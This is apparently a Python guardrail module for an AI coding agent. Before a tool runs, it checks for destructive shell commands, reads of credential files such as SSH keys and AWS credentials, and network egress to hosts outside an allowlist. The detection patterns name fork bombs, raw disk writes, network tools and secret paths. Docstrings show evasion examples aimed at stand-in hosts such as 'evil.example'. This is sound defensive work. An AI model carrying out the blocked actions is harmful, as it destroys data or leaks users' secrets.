"""Pre-execution guardrails hook for gptme (RFC #3598).

Provides deterministic, below-the-model security guardrails that can block
tool execution before it reaches the OS.  Three independent check layers run
in priority order:

1. **Shell policy** — block destructive shell patterns (fork bombs, raw disk
   writes, DROP TABLE, chmod 000, etc.) regardless of model justification.
2. **Secret-read denial** — refuse reads of private key / credential paths
   (~/.ssh private keys, ~/.aws/credentials, *.pem, .env, etc.) by any tool.
3. **Egress allowlist** — deny network egress (curl/wget/nc/…) to hosts not
   on an explicit allowlist (``GPTME_EGRESS_ALLOWLIST``).

Mode is set by the ``GPTME_GUARDRAILS`` environment variable:

  ``off``     — disabled entirely (no-op hook; useful to silence the log notice)
  ``shadow``  — log violations; never blocks (default, zero behavior change)
  ``enforce`` — returns ``ConfirmationResult.skip()`` for any violation

In shadow mode gptme emits a ``WARNING`` log line for each would-be violation
so you can preview what the guardrail *would* block before turning it on.

Hook type:  ``TOOL_CONFIRM`` at priority 200 (runs before auto_confirm=0,
            shell_allowlist=10, and the interactive confirm hooks).

Usage::

    # Preview mode (log-only, default):
    GPTME_GUARDRAILS=shadow gptme ...

    # Enforcement mode:
    GPTME_GUARDRAILS=enforce gptme ...

    # Egress allowlist for enforcement:
    GPTME_GUARDRAILS=enforce GPTME_EGRESS_ALLOWLIST=api.openai.com,example.com gptme ...
"""

from __future__ import annotations

import logging
import os
import re
from typing import TYPE_CHECKING
from urllib.parse import urlparse

if TYPE_CHECKING:
    from pathlib import Path

    from ..tools.base import ToolUse

from .confirm import ConfirmationResult

logger = logging.getLogger(__name__)

_VALID_MODES = frozenset({"off", "shadow", "enforce"})
_WRITE_TOOLS = frozenset({"save", "append", "patch", "patch_many", "morph"})
_SHELL_KEYGEN = re.compile(
    r"\b(?:ssh-keygen|openssl\s+(?:genrsa|req|ecparam|gendsa|genpkey))\b"
)
# Command / process substitution inside a keygen segment can still *read*
# a .pem/.key (e.g. `openssl genrsa … $(cat server.pem)`). The keygen skip
# is only for the generated output file, not nested commands.
_SHELL_NESTED = re.compile(r"\$\(|`|<\(|>\(")

# ── Shell policy patterns ──────────────────────────────────────────────────────
# (pattern, short_reason)
_SHELL_POLICY: list[tuple[re.Pattern[str], str]] = [
    # Fork bombs
    (re.compile(r":\(\)\s*\{.*?:\s*\|"), "fork bomb (: shell function)"),
    (re.compile(r"\bforkbomb\b", re.IGNORECASE), "explicit fork bomb"),
    # Raw disk writes — include partition suffixes (sda1, nvme0n1, nvme0n1p2).
    # A trailing \b after `nvme\d` fails on nvme0n1 because `n` is a word char.
    (
        re.compile(
            r"\bdd\b.*\bof=/dev/(?:sd[a-z]\d*|nvme\d+(?:n\d+(?:p\d+)?)?|hd[a-z]\d*)\b"
        ),
        "raw disk write (dd)",
    ),
    (
        re.compile(r">\s*/dev/(?:sd[a-z]\d*|nvme\d+(?:n\d+(?:p\d+)?)?|hd[a-z]\d*)\b"),
        "raw disk overwrite",
    ),
    # Destructive SQL — only when piped into a DB client or executed via -e/-c
    (
        re.compile(r"\bDROP\s+(?:TABLE|DATABASE|SCHEMA)\b", re.IGNORECASE),
        "destructive SQL (DROP TABLE/DATABASE/SCHEMA)",
    ),
    (
        re.compile(r"\bTRUNCATE\s+TABLE\b", re.IGNORECASE),
        "destructive SQL (TRUNCATE TABLE)",
    ),
    # chmod 000 — blocks all access (even root cannot open the file without chmod)
    (re.compile(r"\bchmod\b.*\b000\b"), "chmod 000 (locks out all access)"),
    # Common crypto-miner command names
    (
        re.compile(r"\b(?:xmrig|cpuminer|minerd|nicehash)\b", re.IGNORECASE),
        "crypto miner binary",
    ),
]

# Home-dir secret prefixes: tilde (`~/.aws/...`), absolute (`/home/alice/.aws/...`),
# relative (`.aws/...`), and whitespace-prefixed. The `/` alternative is what
# catches `/home/alice/.aws/credentials` — a tilde-only pattern misses it.
_HOME_SECRET = r"(?:^|[/\s~])"

# ── Secret-read path patterns ──────────────────────────────────────────────────
# High-confidence identity/credential locations: always flagged on read + shell.
_SECRET_PATH_STRICT: list[re.Pattern[str]] = [
    # SSH private keys (but not config/known_hosts/authorized_keys)
    re.compile(
        _HOME_SECRET + r"\.ssh/(?!(?:config|known_hosts|authorized_keys)(?:\b|$))"
    ),
    re.compile(r"/\.ssh/id_(?:rsa|ed25519|ecdsa|dsa)(?:\b|$)"),
    re.compile(r"(?:^|[\s])\.ssh/id_(?:rsa|ed25519|ecdsa|dsa)(?:\b|$)"),
    # AWS credentials
    re.compile(_HOME_SECRET + r"\.aws/credentials"),
    # GPG secret keyring
    re.compile(_HOME_SECRET + r"\.gnupg/(?:secring|private-keys)"),
    # Kubernetes secrets
    re.compile(_HOME_SECRET + r"\.kube/"),
    # Unix shadow / etc passwords
    re.compile(r"/etc/shadow\b"),
    # dotenv files that typically hold secrets
    re.compile(r"(?:^|[/\s])\.env(?:\.local|\.prod(?:uction)?|\.secret)?(?:\b|$)"),
    # Generic secret config filenames
    re.compile(r"\b(?:secrets?|credentials?)\.(?:ya?ml|json|toml|ini)\b"),
]
# Suffixes that are secrets when *read* but also legitimate write/keygen targets.
_SECRET_PATH_GENERIC: list[re.Pattern[str]] = [
    re.compile(r"\.(?:pem|key|p12|pfx|crt|cert)(?:\b|$)"),
]

# ── Egress command detection ───────────────────────────────────────────────────
# `(?!-)` so `\bssh\b` cannot match the `ssh` prefix of `ssh-keygen` /
# `ssh-agent` / `ssh-add` (`-` is a non-word character, so a bare `\b` does).
_EGRESS_CMD = re.compile(
    r"\b(?:curl|wget|nc|netcat|ncat|nmap|ssh|scp|rsync|ftp|sftp|socat)(?!-)\b"
)
_NON_HTTP_EGRESS = re.compile(
    r"\b(?:nc|netcat|ncat|nmap|ssh|scp|rsync|ftp|sftp|socat)(?!-)\b"
)
_HTTP_URL = re.compile(r"https?://[^\s'\"\\]+")
_SCP_HOST = re.compile(
    r"(?:^|[\s])(?:[\w.-]+@)?([a-zA-Z0-9][a-zA-Z0-9.-]*[a-zA-Z0-9])(?::[^\s:]*)"
)
_SSH_INVOCATION = re.compile(r"\bssh(?!-)\b([^;&|\n]*)")
_NC_INVOCATION = re.compile(r"\b(?:nc|netcat|ncat)(?!-)\b([^;&|\n]*)")
_DOTTED_HOST = re.compile(r"(?:[\w.-]+@)?([a-zA-Z0-9][a-zA-Z0-9.-]*\.[a-zA-Z0-9.-]+)")
_SSH_FLAGS_WITH_ARG = frozenset(
    {
        "-b",
        "-c",
        "-D",
        "-E",
        "-e",
        "-F",
        "-I",
        "-i",
        "-J",
        "-L",
        "-l",
        "-m",
        "-O",
        "-o",
        "-p",
        "-Q",
        "-R",
        "-S",
        "-W",
        "-w",
    }
)
_URL_SCHEMES = frozenset({"http", "https", "ftp", "sftp", "ssh", "file", "git"})
# curl --resolve HOST:PORT:ADDR[,ADDR...] and --connect-to HOST1:PORT1:HOST2:PORT2
# pin the TCP destination independently of the URL hostname.
_CURL_DEST_OVERRIDE = re.compile(
    r"(?:^|[\s])(?:--resolve|--connect-to)(?:=|\s+)\+?(\S+)"
)
# curl proxy / SOCKS flags send traffic to a different host than the URL.
# Long options require '=' or whitespace so `--proxy-user` is not a proxy dest.
_CURL_PROXY_LONG = re.compile(
    r"(?:^|[\s])(?:--proxy|--proxy1\.0|--preproxy|--socks4a?|--socks5(?:-hostname)?)"
    r"(?:=|\s+)\+?(\S+)"
)
# `-x VALUE`, `-xVALUE`, and clustered short options where `x` consumes the
# rest of the token (`-vvxhttp://proxy:8080`). Case-sensitive: curl `-X` is
# the request method, not a proxy flag.
_CURL_PROXY_SHORT = re.compile(r"(?:^|[\s])-[A-Za-z]*x\s*(\S+)")


def _mode() -> str:
    """Return the active guardrails mode: ``off`` | ``shadow`` | ``enforce``.

    Unrecognized values (typos such as ``shdow``) fall back to ``shadow`` so a
    misconfigured env var never silently enables enforcement.
    """
    raw = os.environ.get("GPTME_GUARDRAILS", "shadow").strip().lower()
    if raw in _VALID_MODES:
        return raw
    return "shadow"


def _egress_allowlist() -> list[str]:
    """Return the egress allowlist from ``GPTME_EGRESS_ALLOWLIST`` (CSV)."""
    raw = os.environ.get("GPTME_EGRESS_ALLOWLIST", "")
    return [h.strip() for h in raw.split(",") if h.strip()]


def _unescape_cmd_escapes(cmd: str) -> str:
    """Normalize bash spelling tricks so ``c\\url`` / ``c"url"`` inspect as ``curl``.

    Bash removes backslash escapes and concatenates quoted fragments before
    execution; matching the raw string would miss command-name evasion such as
    ``c\\url https://evil.example`` or ``c"url" https://evil.example``. ANSI-C
    quotes (``$'curl'``), ``eval``, and aliases remain out of scope — this is
    a heuristic, not a shell parser.
    """
    cmd = re.sub(r"\\(.)", r"\1", cmd)
    return cmd.replace('"', "").replace("'", "")


def _check_shell_policy(cmd: str) -> str | None:
    """Return a reason string if *cmd* violates shell policy, else ``None``."""
    cmd = _unescape_cmd_escapes(cmd)
    for pattern, reason in _SHELL_POLICY:
        if pattern.search(cmd):
            return reason
    return None


def _check_secret_read(content: str, *, include_generic: bool = True) -> str | None:
    """Return a reason string if *content* references a secret path, else ``None``."""
    patterns = list(_SECRET_PATH_STRICT)
    if include_generic:
        patterns.extend(_SECRET_PATH_GENERIC)
    for pattern in patterns:
        if pattern.search(content):
            return f"sensitive path reference ({pattern.pattern!r})"
    return None


def _http_hosts(cmd: str) -> list[str]:
    """Extract hostnames from HTTP(S) URLs, stripping userinfo via urlparse."""
    hosts: list[str] = []
    for match in _HTTP_URL.finditer(cmd):
        hostname = urlparse(match.group(0)).hostname
        if hostname:
            hosts.append(hostname)
    return hosts


def _non_http_hosts(cmd: str) -> list[str]:
    """Extract scp/rsync/ssh/nc destinations that are not HTTP(S) URLs."""
    hosts: list[str] = []
    for match in _SCP_HOST.finditer(cmd):
        host = match.group(1)
        if host.lower() not in _URL_SCHEMES:
            hosts.append(host)
    for match in _SSH_INVOCATION.finditer(cmd):
        host = _host_from_argv(match.group(1), _SSH_FLAGS_WITH_ARG)
        if host:
            hosts.append(host)
    for match in _NC_INVOCATION.finditer(cmd):
        host = _host_from_argv(match.group(1), _SSH_FLAGS_WITH_ARG)
        if host:
            hosts.append(host)
    return hosts


def _host_from_argv(argv: str, flags_with_arg: frozenset[str]) -> str | None:
    """Return the first hostname-like token after skipping flags and their args."""
    dotted = _DOTTED_HOST.search(argv)
    if dotted:
        return dotted.group(1)
    tokens = argv.split()
    i = 0
    while i < len(tokens):
        tok = tokens[i]
        if tok.startswith("-"):
            flag = tok[:2] if len(tok) >= 2 else tok
            if flag in flags_with_arg and len(tok) == 2:
                i += 2
            else:
                i += 1
            continue
        if tok.isdigit():
            i += 1
            continue
        host = tok.rsplit("@", 1)[-1].split(":", 1)[0]
        if host and host.lower() not in _URL_SCHEMES:
            return host
        i += 1
    return None


def _host_allowlisted(host: str, allowlist: list[str]) -> bool:
    host_l = host.lower()
    return any(
        host_l == allowed.lower() or host_l.endswith("." + allowed.lower())
        for allowed in allowlist
    )


def _dest_from_curl_override(spec: str) -> list[str]:
    """Extract destination host(s)/IP(s) from a curl --resolve/--connect-to spec.

    ``--resolve HOST:PORT:ADDR[,ADDR...]`` and
    ``--connect-to HOST1:PORT1:HOST2:PORT2`` both put the real destination in
    the third colon-separated field. IPv6 addresses may be bracketed.
    """
    spec = spec.strip("\"'")
    bracket = re.search(r"\[([^\]]+)\]", spec)
    if bracket:
        return [bracket.group(1)]
    parts = spec.split(":")
    if len(parts) < 3:
        return []
    dest = parts[2]
    return [d for d in dest.split(",") if d]


def _curl_override_hosts(cmd: str) -> tuple[list[str], bool]:
    """Return (destinations, had_unparsed_override) from curl dest-override flags."""
    hosts: list[str] = []
    unparsed = False
    for match in _CURL_DEST_OVERRIDE.finditer(cmd):
        dests = _dest_from_curl_override(match.group(1))
        if dests:
            hosts.extend(dests)
        else:
            unparsed = True
    return hosts, unparsed


def _host_from_proxy_spec(spec: str) -> str | None:
    """Extract the hostname from a curl ``-x`` / ``--proxy`` / SOCKS argument."""
    spec = spec.strip("\"'")
    if not spec or spec.startswith("-"):
        return None
    parsed = urlparse(spec if "://" in spec else f"//{spec}")
    if parsed.hostname:
        return parsed.hostname
    host = spec.split("/")[0].rsplit("@", 1)[-1]
    if host.startswith("[") and "]" in host:
        return host[1 : host.index("]")]
    host = host.split(":")[0]
    return host or None


def _curl_proxy_hosts(cmd: str) -> tuple[list[str], bool]:
    """Return (proxy destinations, had_unparsed_proxy) from curl proxy/SOCKS flags."""
    hosts: list[str] = []
    unparsed = False
    specs = [m.group(1) for m in _CURL_PROXY_LONG.finditer(cmd)]
    specs.extend(m.group(1) for m in _CURL_PROXY_SHORT.finditer(cmd))
    for spec in specs:
        host = _host_from_proxy_spec(spec)
        if host:
            hosts.append(host)
        else:
            unparsed = True
    return hosts, unparsed


def _check_egress(cmd: str, allowlist: list[str]) -> str | None:
    """Return reason string for non-allowlisted egress in *cmd*, else ``None``.

    Always returns ``None`` when the allowlist is empty (no allowlist configured
    means the egress check is inactive — users must opt in by setting
    ``GPTME_EGRESS_ALLOWLIST``).

    Mixed commands such as ``curl https://allowlisted.example && scp file evil:``
    must not be approved just because the HTTP host is allowlisted.
    Curl ``--resolve`` / ``--connect-to`` destination overrides and
    ``-x`` / ``--proxy`` / SOCKS hops are checked independently of the URL hostname.
    """
    if not allowlist:
        return None  # egress check inactive — no allowlist configured
    cmd = _unescape_cmd_escapes(cmd)
    if not _EGRESS_CMD.search(cmd):
        return None
    http_hosts = _http_hosts(cmd)
    other_hosts = _non_http_hosts(cmd)
    override_hosts, unparsed_override = _curl_override_hosts(cmd)
    proxy_hosts, unparsed_proxy = _curl_proxy_hosts(cmd)
    if unparsed_override:
        return "network command with unparsed destination override (allowlist active)"
    if unparsed_proxy:
        return "network command with unparsed proxy destination (allowlist active)"
    hosts = http_hosts + other_hosts + override_hosts + proxy_hosts
    if _NON_HTTP_EGRESS.search(cmd) and not other_hosts:
        return "network command with unparsed non-HTTP destination (allowlist active)"
    if not hosts:
        return "network command with no parseable host (allowlist active)"
    for host in hosts:
        if not _host_allowlisted(host, allowlist):
            return f"network egress to non-allowlisted host {host!r}"
    return None


def _tool_corpus(tool_use: ToolUse, preview: str | None = None) -> str:
    """Collect the text the policy should inspect (preview, content, args, kwargs)."""
    parts: list[str] = []
    if preview:
        parts.append(preview)
    if tool_use.content:
        parts.append(tool_use.content)
    if tool_use.args:
        parts.append(" ".join(str(a) for a in tool_use.args))
    if tool_use.kwargs:
        parts.append(" ".join(str(v) for v in tool_use.kwargs.values()))
    return "\n".join(parts)


def _evaluate(tool_use: ToolUse, preview: str | None = None) -> str | None:
    """Run all three guardrail checks and return the first violation reason, or None."""
    content = _tool_corpus(tool_use, preview)
    tool_name = tool_use.tool

    # 1. Shell policy — shell tool only
    if tool_name == "shell":
        reason = _check_shell_policy(content)
        if reason:
            return f"shell policy: {reason}"

    # 2. Secret-read denial — reads of credential paths, not writes/keygen.
    # Generic suffixes (.pem/.key) apply to every non-write tool so python
    # `open("server.pem")` and `grep server.pem` still block. Shell keygen
    # is the exception: generating a key is not a secret *read*.
    if tool_name not in _WRITE_TOOLS:
        if tool_name == "shell":
            for segment in re.split(r"\s*(?:&&|\|\||;|\||\n)\s*", content):
                # Same unescape as shell-policy/egress: `cat ~/.ss\h/id_rsa`
                # is a secret read after bash removes the backslash.
                segment = _unescape_cmd_escapes(segment)
                # Keygen may write .pem/.key; keep generic checks if the
                # segment also nests a command that could read one.
                include_generic = not bool(_SHELL_KEYGEN.search(segment)) or bool(
                    _SHELL_NESTED.search(segment)
                )
                reason = _check_secret_read(segment, include_generic=include_generic)
                if reason:
                    return f"secret-read: {reason}"
        else:
            reason = _check_secret_read(content, include_generic=True)
            if reason:
                return f"secret-read: {reason}"

    # 3. Egress allowlist — shell tool only (requires GPTME_EGRESS_ALLOWLIST)
    if tool_name == "shell":
        reason = _check_egress(content, _egress_allowlist())
        if reason:
            return f"egress: {reason}"

    return None


def guardrails_hook(
    tool_use: ToolUse,
    preview: str | None = None,
    workspace: Path | None = None,
) -> ConfirmationResult | None:
    """TOOL_CONFIRM guardrail hook.

    Runs three deterministic policy checks.  In ``shadow`` mode violations are
    logged but execution is not blocked.  In ``enforce`` mode violations return
    ``ConfirmationResult.skip()``.  Returns ``None`` when there is no violation
    (falls through to the next hook in the chain).
    """
    mode = _mode()
    if mode == "off":
        return None

    # Preview (full bg context) is included alongside content/args/kwargs.
    violation = _evaluate(tool_use, preview)

    if violation is None:
        return None

    if mode == "shadow":
        logger.warning(
            "guardrails [shadow]: would block %s — %s",
            tool_use.tool,
            violation,
        )
        return None  # fall through — shadow mode never blocks

    # enforce mode
    msg = f"[guardrails] blocked: {violation}"
    logger.warning("guardrails [enforce]: blocking %s — %s", tool_use.tool, violation)
    return ConfirmationResult.skip(msg)


def register() -> None:
    """Register the guardrails TOOL_CONFIRM hook.

    The hook is registered at priority 200, which is higher than both the
    shell allowlist hook (priority 10) and auto_confirm (priority 0), so
    guardrails can intercept even allowlisted commands.

    The hook only activates when ``GPTME_GUARDRAILS`` is ``shadow`` or
    ``enforce``; it is a no-op in ``off`` mode (but still registered so it
    can be listed).
    """
    from . import HookType, register_hook

    raw = os.environ.get("GPTME_GUARDRAILS", "shadow").strip().lower()
    mode = raw if raw in _VALID_MODES else "shadow"
    if raw != mode:
        logger.warning(
            "GPTME_GUARDRAILS=%r is not a valid mode (shadow|enforce|off); "
            "defaulting to shadow",
            raw,
        )

    register_hook(
        name="guardrails",
        hook_type=HookType.TOOL_CONFIRM,
        func=guardrails_hook,
        priority=200,
        enabled=True,
    )
    logger.debug("Registered guardrails hook (mode=%s)", mode)
